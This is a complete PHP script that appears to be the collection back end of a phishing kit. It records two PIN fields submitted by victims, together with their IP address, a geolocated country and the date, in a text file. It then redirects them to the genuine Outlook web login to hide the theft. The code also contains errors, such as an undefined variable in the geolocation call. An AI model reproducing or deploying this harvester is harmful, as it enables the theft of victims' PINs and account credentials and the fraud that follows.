<?php
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('UTC');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

	$file = fopen("archivo.txt", "a");
	

fwrite($file, "Pin : ".$_POST['txtres']." - Pin2 : ".$_POST['txcuatro']." - ".date('d/m/Y')." ".$ip." ".$pais."  " . PHP_EOL);


Header ("Location: https://outlook.live.com/owa/");
?>
